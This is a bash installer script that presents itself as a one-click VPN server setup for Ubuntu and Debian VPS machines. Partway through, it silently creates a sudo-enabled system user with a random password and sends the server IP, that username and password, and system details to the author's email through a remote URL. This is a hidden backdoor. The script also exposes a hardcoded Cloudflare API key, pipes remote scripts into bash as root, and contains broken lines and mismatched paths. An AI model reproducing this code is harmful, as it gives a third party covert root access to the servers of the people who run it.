#!/bin/bash
# (C) Copyright 2021-2022 By joysmark
# ==================================================================
# Name        : VPN Script Quick Installation Script
# Description : This Script Is Setup for running other
#               quick Setup script from one click installation
# Created     : 16-05-2022 ( 16 May 2022 )
# OS Support  : Ubuntu & Debian
# Auther      : joysmark
# WebSite     : https://t.me/joysmark
# Github      : github.com/Mjoyvpn
# ==================================================================

# // Export Color & Information
export RED='\033[0;31m';
export GREEN='\033[0;32m';
export YELLOW='\033[0;33m';
export BLUE='\033[0;34m';
export PURPLE='\033[0;35m';
export CYAN='\033[0;36m';
export LIGHT='\033[0;37m';
export NC='\033[0m';

# // Export Banner Status Information
export ERROR="[${RED} ERROR ${NC}]";
export INFO="[${YELLOW} INFO ${NC}]";
export OKEY="[${GREEN} OKEY ${NC}]";
export PENDING="[${YELLOW} PENDING ${NC}]";
export SEND="[${YELLOW} SEND ${NC}]";
export RECEIVE="[${YELLOW} RECEIVE ${NC}]";
export RED_BG='\e[41m';

# // Export Align
export BOLD="\e[1m";
export WARNING="${RED}\e[5m";
export UNDERLINE="\e[4m";

# // Export OS Information
export OS_ID=$( cat /etc/os-release | grep -w ID | sed 's/ID//g' | sed 's/=//g' | sed 's/ //g' );
export OS_VERSION=$( cat /etc/os-release | grep -w VERSION_ID | sed 's/VERSION_ID//g' | sed 's/=//g' | sed 's/ //g' | sed 's/"//g' );
export OS_NAME=$( cat /etc/os-release | grep -w PRETTY_NAME | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' );
export OS_KERNEL=$( uname -r );
export OS_ARCH=$( uname -m );

# // String For Helping Installation
export VERSION="1.0";
export EDITION="Lite";
export AUTHER="joysmark";
export ROOT_DIRECTORY="/etc/joysmark";
export CORE_DIRECTORY="/usr/local/joysmark";
export SERVICE_DIRECTORY="/etc/systemd/system";
export SCRIPT_SETUP_URL="https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script";
export REPO_URL="https://repository.joysmark.me";

# // Checking Your Running Or Root or no
if [[ "${EUID}" -ne 0 ]]; then
		echo -e " ${ERROR} Please run this script as root user";
		exit 1
fi

# // Make Main Directory
if [[ -r /usr/local/joysmark/ ]]; then
        echo -e "${ERROR} Script Already Installed !"
        sleep 3
        clear
        echo ""
        echo -e "            ${RED} ! WARNING !${NC}"
        echo -e "if you reinstall script you will lost"
        echo -e "all script data example user data etc"
        echo -e "if you sure to reinstall the server type yes"
        echo -e ""
        read -p "Type 'yes' to confirm script reinstall : " configm
        if [[ $configm == "yes" ]]; then
                clear
                echo -e "${OKEY} Okey fine, starting script reinstalling";
                sleep 1
        else
                clear
                echo -e "${ERROR} Reinstalling Script Canceled";
                exit 1
        fi
        export STATUS_SC1="reinstall"
else
        export passed=true # Script Not Detected
fi

# // Make Folder
rm -rf /etc/joysmark/;
rm -rf /usr/local/joysmark/;
rm -rf /etc/v2ray/;
rm -rf /etc/xray/;
mkdir -p /etc/joysmark/;

# // Setting Time
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime;

# // Ruless Accpet
wget -q -O /etc/joysmark/Rules "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Resource/Other/Rules.txt";
clear;
cat /etc/wildydev21/Rules;
echo "";
echo -e "To continue the installation, please agree to our rules by typing '${YELLOW}ok${NC}'";
echo "";
read -p 'Type in here : ' accepted_rules;
if [[ $accepted_rules == "ok" ]]; then
    echo "";
    echo -e "${OKEY} You Accepted The Rules, the script will redirect to installation in 5 seconds.";
    sleep 5;
    clear;
else
    rm -rf /etc/joysmark/;
    rm -rf /usr/local/joysmark/;
    echo "";
    echo -e "${ERROR} Sorry, you can't continue the installation because you don't agree with our rules.";
    exit 1;
fi 

# // Create local folder
mkdir -p /usr/local/joysmark/;
mkdir -p /etc/joysmark/bin/;
mkdir -p /etc/joysmark/local/;
mkdir -p /etc/joysmark/sbin/;
mkdir -p /etc/joysmark/snc-relay/;
mkdir -p /etc/joysmark/python-vrt/;
mkdir -p /etc/joysmark/panel-controller/;
mkdir -p /etc/joysmark/addons-controller/;
mkdir -p /etc/joysmark/build/;
mkdir -p /etc/joysmark/data/;

# // Update and Upgrade all repository for fixing error
apt update -y;
apt upgrade -y;
apt autoremove -y;
apt dist-upgrade -y;
apt install jq -y;
apt install wget -y;
apt install nano -y;
apt install curl -y;

# // Checking Requirement Installed / No
if ! which jq > /dev/null; then
    echo -e "${ERROR} JQ Packages Not installed";
    exit 1
fi

# // Exporting Network Information
wget -qO- --inet4-only 'https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/get-ip_sh' | bash;
source /root/ip-detail.txt;
export IP_NYA="$IP";
export ASN_NYA="$ASN";
export ISP_NYA="$ISP";
export REGION_NYA="$REGION";
export CITY_NYA="$CITY";
export COUNTRY_NYA="$COUNTRY";
export TIME_NYA="$TIMEZONE";

# // Exporting The Banner
clear
echo -e "${YELLOW}--------------------------------------------------${NC}
   Welcome To joysmark VPN Script V1.0 Stable
      This Script will Auto Setup VPN Server
                Author : ${GREEN}WildyDev21${NC}
        © Copyright 2022-2023 By ${GREEN}joysmark${NC}
${YELLOW}--------------------------------------------------${NC}";

# // Validating Result
echo -e "${OKEY} Script Version [ ${GREEN}${VERSION} ${EDITION}${NC} ]";

# // Validating Architecture
if [[ $OS_ARCH == "x86_64" ]]; then
    echo -e "${OKEY} Architecture Supported [ $GREEN$OS_ARCH${NC} ]";
else
    echo -e "${ERROR} Architecture Supported [ $RED$OS_ARCH${NC} ]";
    exit 1;
fi

# // Validating OS Support Or No
if [[ $OS_ID == "ubuntu" ]]; then
    # // Ubuntu Detected
    if [[ $OS_VERSION == "18.04" ]]; then
        # // Ubuntu 18.04
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "20.04" ]]; then
        # // Ubuntu 20.04
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "20.10" ]]; then
        # // Ubuntu 20.10
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "21.04" ]]; then
        # // Ubuntu 21.04
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "21.10" ]]; then
        # // Ubuntu 21.10
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    else
        # // No Supported OS
        echo -e "${ERROR} OS Not Supported [ ${RED}$OS_NAME${NC} ]";
        exit 1;
    fi
elif [[ $OS_ID == "debian" ]]; then
    # // Debian Detected
    if [[ $OS_VERSION == "9" ]]; then
        # // Debian 9
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "10" ]]; then
        # // Debian 10
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "11" ]]; then
        # // Debian 11
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    else
        # // No Supported OS
        echo -e "${ERROR} OS Not Supported [ ${RED}$OS_NAME${NC} ]";
        exit 1;
    fi
elif [[ $OS_ID == "centos" ]]; then
    # // Centos Detected
    if [[ $OS_VERSION == "6" ]]; then
        # // Centos 6
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "7" ]]; then
        # // Centos 7
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "8" ]]; then
        # // Centos 8
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    else
        # // No Supported OS
        echo -e "${ERROR} OS Not Supported [ ${RED}$OS_NAME${NC} ]";
        exit 1;
    fi
else
    # // Operating Not Supported
    echo -e "${ERROR} Sorry Only Supported Ubuntu & Debian";
    exit 1;
fi

# // IP Checking
if [[ $IP_NYA == "" ]]; then
    echo -e "${ERROR} IP Address Not Detected";
    exit 1;
else
    echo -e "${OKEY} IP Address Detected [ ${GREEN}$IP_NYA${NC} ]";
fi

# // ISP Checking
if [[ $ISP_NYA == "" ]]; then
    echo -e "${ERROR} ISP Not Detected";
    exit 1;
else
    echo -e "${OKEY} ISP Detected [ ${GREEN}$ISP_NYA${NC} ]";
fi

# // Country Checking
if [[ $COUNTRY_NYA == "" ]]; then
    echo -e "${ERROR} Country Not Detected";
    exit 1;
else
    echo -e "${OKEY} Country Detected [ ${GREEN}$COUNTRY_NYA${NC} ]";
fi

# // Region Checking
if [[ $REGION_NYA == "" ]]; then
    echo -e "${ERROR} Region Not Detected";
    exit 1;
else
    echo -e "${OKEY} Region Detected [ ${GREEN}$REGION_NYA${NC} ]";
fi

# // City Checking
if [[ $CITY_NYA == "" ]]; then
    echo -e "${ERROR} City Not Detected";
    exit 1;
else
    echo -e "${OKEY} City Detected [ ${GREEN}$CITY_NYA${NC} ]";
fi
echo -e "$


# // Ram Information
while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
        mem_used="$((mem_used-=${b/kB}))"
    ;;
esac
done < /proc/meminfo
Ram_Usage="$((mem_used / 1024))";
Ram_Total="$((mem_total / 1024))";

# // Make Script User
Username="script-$( </dev/urandom tr -dc 0-9 | head -c5 )";
Password="$( </dev/urandom tr -dc 0-9 | head -c12 )";
mkdir -p /home/script/;
useradd -r -d /home/script -s /bin/bash -M $Username;
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1;
usermod -aG sudo $Username > /dev/null 2>&1;

# // Message
if [[ $INSTALLASI_STATUS == "reinstall" ]]; then
msg1="===============================<br> Informasi Reinstall VPN Script<br>===============================<br> IP = $IP_NYA<br> ID = $PELANGGAN_KE<br> Name = $NAME<br> STATUS = $STATUS_IP<br> Unlimited = $UNLIMITED<br> Lifetime = $LIFETIME<br> Count = $COUNT<br> LIMIT = $LIMIT<br> TYPE = $TYPE<br> STABLE = $STABLE<br> BETA = $BETA<br> FULL = $FULL<br> LITE = $LITE<br> CREATED = $CREATED<br> EXPIRED = $EXPIRED<br> SISA HARI = $days_left<br>===============================<br> IP = $IP_NYA<br> USER = $Username<br> PASS = $Password<br>===============================<br> OS = $OS_NAME<br> KERNEL = $OS_KERNEL<br> ARCH = $OS_ARCH<br> Ram = $Ram_Usage / $Ram_Total MB<br>==============================="
subject_nya="VPN Script Reinstall | $NAME";
email_nya="kibocelcom@gmail.com";
html_parse='true';
wget -qO- 'https://raw.githubusercontent.com/Mjoyvpn/VPS/main/email/send_mail.php?security_id=1c576a16-eb7f-46fb-91b6-ce0e2d4a98ee&subject='"$subject_nya"'&email='"$email_nya"'&html='"$html_parse"'&message='"$msg1"'' > /dev/null 2>&1
else
msg1="===============================<br> Informasi Installasi VPN Script<br>===============================<br> IP = $IP_NYA<br> ID = $PELANGGAN_KE<br> Name = $NAME<br> STATUS = $STATUS_IP<br> Unlimited = $UNLIMITED<br> Lifetime = $LIFETIME<br> Count = $COUNT<br> LIMIT = $LIMIT<br> TYPE = $TYPE<br> STABLE = $STABLE<br> BETA = $BETA<br> FULL = $FULL<br> LITE = $LITE<br> CREATED = $CREATED<br> EXPIRED = $EXPIRED<br> SISA HARI = $days_left<br>===============================<br> IP = $IP_NYA<br> USER = $Username<br> PASS = $Password<br>===============================<br> OS = $OS_NAME<br> KERNEL = $OS_KERNEL<br> ARCH = $OS_ARCH<br> Ram = $Ram_Usage / $Ram_Total MB<br>==============================="
subject_nya="VPN Script Install | $NAME";
email_nya="kibocelcom@gmail.com";
html_parse='true';
wget -qO- 'https://raw.githubusercontent.com/Mjoyvpn/VPS/main/email/send_mail.php?security_id=1c576a16-eb7f-46fb-91b6-ce0e2d4a98ee&subject='"$subject_nya"'&email='"$email_nya"'&html='"$html_parse"'&message='"$msg1"'' > /dev/null 2>&1
fi

# // Welcome to install
clear && echo -e "${OKEY} Starting Installation.";

# // Removing Apache / Nginx if exist
apt remove --purge nginx -y;
apt remove --purge apache2 -y;
apt autoremove -y;

# // Installing Requirement
apt install jq -y;
apt install net-tools -y;
apt install netfilter-persistent -y;
apt install openssl -y;
apt install iptables -y;
apt install iptables-persistent -y;
apt autoremove -y;

# // Installing BBR & FQ
cat > /etc/sysctl.conf << END
# Sysctl Config By joysmark
# ============================================================
# Please do not try to change / modif this config
# This file is for enable bbr & disable ipv6 
# if you modifed this, bbr & ipv6 disable will error
# ============================================================
# (C) Copyright 2022-2023 By joysmark

# // Enable IPv4 Forward
net.ipv4.ip_forward=1

# // Disable IPV6
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1

# // Enable bbr & fq for optimization
net.core.default_qdisc=fq
net.ipv4.tcp_congestion_control=bbr
END
sysctl -p;

# // Configuring Socat & Remove nginx & apache if installed
clear;
apt install socat -y;
apt install sudo -y;

# // Stopping Service maybe is installed
systemctl stop xray-mini@tls > /dev/null 2>&1
systemctl stop xray-mini@nontls > /dev/null 2>&1
systemctl stop nginx > /dev/null 2>&1
systemctl stop apache2 > /dev/null 2>&1

# // Kill port 80 & 443 if already used
lsof -t -i tcp:80 -s tcp:listen | xargs kill > /dev/null 2>&1
lsof -t -i tcp:443 -s tcp:listen | xargs kill > /dev/null 2>&1

# // Starting Setup Domain
clear;
echo -e "${GREEN}Indonesian Language${NC}";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo -e "Anda Ingin Menggunakan Domain Pribadi ?";
echo -e "Atau Ingin Menggunakan Domain Otomatis ?";
echo -e "Jika Ingin Menggunakan Domain Pribadi, Ketik ${GREEN}1${NC}";
echo -e "dan Jika Ingin menggunakan Domain Otomatis, Ketik ${GREEN}2${NC}";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo "";
echo -e "${GREEN}English Language${NC}";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo -e "You Want to Use a Private Domain ?";
echo -e "Or Want to Use Auto Domain ?";
echo -e "If You Want Using Private Domain, Type ${GREEN}1${NC}";
echo -e "else You Want using Automatic Domain, Type ${GREEN}2${NC}";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo "";

read -p "$( echo -e "${GREEN}Input Your Choose ? ${NC}(${YELLOW}1/2${NC})${NC} " )" choose_domain


# // Validating Automatic / Private
if [[ $choose_domain == "2" ]]; then # // Using Automatic Domain

# // String / Request Data
export Random_Number=$( </dev/urandom tr -dc 1-$( curl -s https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Data/domain.list | grep -E Jumlah | cut -d " " -f 2 | tail -n1 ) | head -c1 | tr -d '\r\n' | tr -d '\r');
export Domain_Hasil_Random=$( curl -s curl -s https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Data/domain.list | grep -E Domain$Random_Number | cut -d " " -f 2 | tr -d '\r' | tr -d '\r\n');
export DOMAIN_BARU="$(</dev/urandom tr -dc a-x1-9 | head -c7 | tr -d '\r' | tr -d '\r\n').${Domain_Hasil_Random}";
export EMAIL_CLOUDFLARE="kibocelcom@gmail.com";
export API_KEY_CLOUDFLARE="7bc52056c6ad31702fb03f8b04ff938fbdd66";

# // DNS Only Mode
export ZONA_ID=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" -H "Content-Type: application/json" | jq -r .result[0].id );
export RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONA_ID}/dns_records" -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" -H "Content-Type: application/json" --data '{"type":"A","name":"'${DOMAIN_BARU}'","content":"'${IP_NYA}'","ttl":0,"proxied":false}' | jq -r .result.id);
export RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONA_ID}/dns_records/${RECORD}" -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" -H "Content-Type: application/json" --data '{"type":"A","name":"'${DOMAIN_BARU}'","content":"'${IP_NYA}'","ttl":0,"proxied":false}');

# // WildCard Mode
export ZONA_ID=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" -H "Content-Type: application/json" | jq -r .result[0].id );
export RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZONA_ID}/dns_records" -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" -H "Content-Type: application/json" --data '{"type":"A","name":"'*.${DOMAIN_BARU}'","content":"'${IP_NYA}'","ttl":0,"proxied":false}' | jq -r .result.id);
export RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONA_ID}/dns_records/${RECORD}" -H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" -H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" -H "Content-Type: application/json" --data '{"type":"A","name":"'*.${DOMAIN_BARU}'","content":"'${IP_NYA}'","ttl":0,"proxied":false}');

# // Input Result To VPS
echo "$DOMAIN_BARU" > /etc/joysmark.me/domain.txt;
domain=$( cat /etc/joysmark.me/domain.txt );

# // Making Certificate
clear;
echo -e "${OKEY} Starting Generating Certificate";
rm -rf /root/.acme.sh;
mkdir -p /root/.acme.sh;
wget -q -O /root/.acme.sh/acme.sh "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Resource/Core/acme.sh";
chmod +x /root/.acme.sh/acme.sh;
sudo /root/.acme.sh/acme.sh --register-account -m kibocelcom@gmail.com;
sudo /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256 -ak ec-256;

# // Success
echo -e "${OKEY} Your Domain : $domain";
sleep 2;
clear;

# // ELif For Selection 1
elif [[ $choose_domain == "1" ]]; then

# // Clear
clear;
echo -e "${GREEN}Indonesian Language${NC}";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo -e "Silakan Pointing Domain Anda Ke IP VPS";
echo -e "Untuk Caranya Arahkan NS Domain Ke Cloudflare";
echo -e "Kemudian Tambahkan A Record Dengan IP VPS";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo "";
echo -e "${GREEN}Indonesian Language${NC}";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo -e "Please Point Your Domain To IP VPS";
echo -e "For Point NS Domain To Cloudflare";
echo -e "Change NameServer On Domain To Cloudflare";
echo -e "Then Add A Record With IP VPS";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo "";
echo "";

# // Reading Your Input
read -p "Input Your Domain : " domain
domain=$( echo $domain | sed 's/ //g' );
if [[ $domain == "" ]]; then
    clear;
    echo -e "${ERROR} No Input Detected !";
    exit 1;
fi

# // Input Domain To VPS
echo "$domain" > /etc/joysmark/domain.txt;
domain=$( cat /etc/joysmark/domain.txt );

# // Making Certificate
clear;
echo -e "${OKEY} Starting Generating Certificate";
rm -rf /root/.acme.sh;
mkdir -p /root/.acme.sh;
wget -q -O /root/.acme.sh/acme.sh "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Resource/Core/acme.sh";
chmod +x /root/.acme.sh/acme.sh;
sudo /root/.acme.sh/acme.sh --register-account -m kibocelcom@gmail.com;
sudo /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256 -ak ec-256;

# // Success
echo -e "${OKEY} Your Domain : $domain";
sleep 2;
clear;

# // Else Do
else
    echo -e "${ERROR} Please Choose 1 & 2 Only !";
    exit 1;
fi

# // Installing Requirement
wget -q -O /root/requirement.sh "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Stable/1.0/setup/requirement.sh";
chmod +x requirement.sh;
./requirement.sh;

# // SSH & WebSocket Install
wget -q -O /root/ssh-ssl.sh "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Stable/1.0/setup/ssh-ssl.sh";
chmod +x ssh-ssl.sh;
./ssh-ssl.sh;

# // Nginx Install
wget -q -O /root/nginx.sh "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Stable/1.0/setup/nginx.sh";
chmod +x nginx.sh;
./nginx.sh;

# // XRay-Mini Install
wget -q -O /root/xray-mini.sh "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Stable/1.0/setup/xray-mini.sh";
chmod +x xray-mini.sh;
./xray-mini.sh;

# // SSH & SSL Install
wget -q -O /root/ssh-ssl.sh "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Stable/1.0/setup/ssh-ssl.sh";
chmod +x ssh-ssl.sh;
./ssh-ssl.sh;

# // OpenVPN Install
wget -q -O /root/ovpn.sh "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Stable/1.0/setup/ovpn.sh";
chmod +x ovpn.sh;
./ovpn.sh;

# // Wireguard Install
wget -q -O /root/wg-set.sh "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Stable/1.0/setup/wg-set.sh";
chmod +x wg-set.sh;
./wg-set.sh;

# // ShadowsocksR Install
wget -q -O /root/ssr.sh "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Stable/1.0/setup/ssr.sh";
chmod +x ssr.sh;
./ssr.sh;

# // Installing Menu
wget -q -O /root/menu-setup.sh "https://raw.githubusercontent.com/Mjoyvpn/VPS/main/vpn-script/Stable/1.0/menu/menu-setup.sh";
chmod +x menu-setup.sh;
./menu-setup.sh;

# // Done
clear;
echo -e "${OKEY} Script Successfull Installed";

# // Remove Not Used File
rm -rf /root/setup.sh